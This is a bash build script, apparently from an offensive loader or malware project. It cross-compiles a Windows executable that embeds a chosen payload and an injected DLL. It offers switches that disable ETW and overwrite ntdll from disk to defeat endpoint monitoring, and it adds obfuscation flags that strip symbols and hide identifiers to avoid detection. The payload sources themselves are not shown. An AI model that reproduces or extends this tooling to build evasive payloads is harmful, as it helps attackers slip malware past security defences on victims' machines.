#!/bin/bash

# Exit early on any failure
set -euo pipefail

# Read arguments
PAYLOAD=""
OUTPUT_FILE="executable.exe"
PRIORIZE_SIZE="false"
VERBOSE="false"

usage() {
    echo "Usage: $0 [options] --<payload> | clean"
    echo ""
    echo "Options:"
    echo "  -o, --output <output_file>   Specify the output file name (default: executable.exe)"
    echo "  -s, --small                  Prioritize size over detection (no icon & no stdlib)"
    echo "  -v, --verbose                Enable verbose mode"
    echo "  -h, --help                   Show this help message"
    echo ""
    echo "Payload:"
    echo "  --<payload>                  Exactly one payload must be specified."
    echo "                               Maps to src/dll/<payload>.c (e.g., --foo -> src/dll/foo.c)"
    echo ""
    echo "Evasion:"
    echo "  --etw                        Disable ETW"
    echo "  --ntdll                      Overwrite ntdll from disk"
    echo ""
    echo "Available payloads:"
    if compgen -G "src/dll/payloads/*.c" >/dev/null; then
        for f in src/dll/payloads/*.c; do
            printf '  --%s\n' "$(basename "$f" .c)"
        done
    else
        echo "  (none found in src/dll/payloads)"
    fi
    echo ""
    echo "Commands:"
    echo "  clean                        Clean the build directory"
    echo ""
    echo "Examples:"
    echo "  $0 --small -o out.exe --foo"
    echo "  $0 --help"
    echo "  $0 clean"
    exit 1
}

# Cleanup
if [[ "${1:-}" == "clean" ]]; then
    rm -rf bin build .build
    echo "🧹 Cleaned build and bin directories."
    exit 0
fi

# Recreate build environment
rm -rf build
mkdir -p build/bin bin
cp -r src include build/

while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -o|--output)
      OUTPUT_FILE="${2:?--output requires a file path}"
      shift 2
      ;;
    -s|--small)
      PRIORIZE_SIZE="true"
      shift
      ;;
    -v|--verbose)
      VERBOSE="true"
      shift
      ;;
    -h|--help)
      usage
      ;;

    --) # end of options
      shift
      break
      ;;

    --*)
      mod="${1#--}"  # strip leading --
      if [[ -n "$PAYLOAD" ]]; then
        echo "Error: only one payload allowed (already got --$PAYLOAD, received --$mod)."
        exit 2
      fi
      if [[ -f "src/dll/payloads/${mod}.c" ]]; then
        PAYLOAD="$mod"
        shift
      else
        echo "Error: payload '$mod' not found."
        echo "Available payloads:"
        for f in src/dll/payloads/*.c; do printf '  --%s\n' "$(basename "$f" .c)"; done
        exit 1
      fi
      ;;
    *)
      echo "Unknown option: $1"
      usage
      ;;
  esac
done

# Define source and header files
shopt -s nullglob
SRC=(
    build/src/common/*.c
    build/src/exe/*.c
)
HEADERS=(
    build/include/common/*.h
    build/include/exe/*.h
)
shopt -u nullglob

# Configure options based on PRIORIZE_SIZE
if [[ "$PRIORIZE_SIZE" == "true" ]]; then
    STDLIB="-nostdlib -DLIGHTWEIGHT=1"
    ICON=""
    ENTRYPOINT="WinMainCRTStartup"
else
    STDLIB=""
    ICON="build/icon.o"
    SRC+=("build/icon.o")
    ENTRYPOINT="WinMain"
fi

# Define compiler parameters
CC="x86_64-w64-mingw32-gcc"
CFLAGS=($STDLIB -Ibuild/include/common -Ibuild/include/exe -Wall -Wextra -Os -mwindows -ffunction-sections -fdata-sections -fno-stack-protector -fno-stack-check -fno-strict-aliasing -ffreestanding)
WARNINGS=(-Wtype-limits -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes)
LIBS=(-lkernel32 -luser32 -ladvapi32 -lshell32 -lm -lgcc)
OBFUSCATION=(-s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident)
LDFLAGS=(-Wl,--gc-sections,--entry=$ENTRYPOINT,--disable-auto-import,--no-insert-timestamp)


# Run Python, capture payload type, fail on non-zero exit
if ! python3 main.py "$VERBOSE" "$PRIORIZE_SIZE" "$PAYLOAD"; then
    echo "❌ Erreur : l'exécution de main.py a échoué."
    exit 1
fi

# Compile the icon if necessary
if [[ -n "$ICON" ]]; then
    x86_64-w64-mingw32-windres icon/icon.rc -o "$ICON"
fi

# Compile the program
if [[ "$VERBOSE" == "true" ]]; then
    echo -e "$CC ${CFLAGS[@]} ${WARNINGS[@]} ${SRC[@]} -static -static-libgcc -o bin/$OUTPUT_FILE ${LDFLAGS[@]} ${LIBS[@]} ${OBFUSCATION[@]}\n"
fi

# Compile the main program
$CC "${CFLAGS[@]}" "${WARNINGS[@]}" "${SRC[@]}" -static -static-libgcc -o "bin/$OUTPUT_FILE" "${LDFLAGS[@]}" "${LIBS[@]}" "${OBFUSCATION[@]}"

echo "✅ Build completed. Output file: bin/$OUTPUT_FILE"
echo "🔍 Size: $(du -h bin/$OUTPUT_FILE | cut -f1)"
echo "📦 DLL size: $(du -h build/bin/injected-dll.dll | cut -f1 || echo 'N/A')"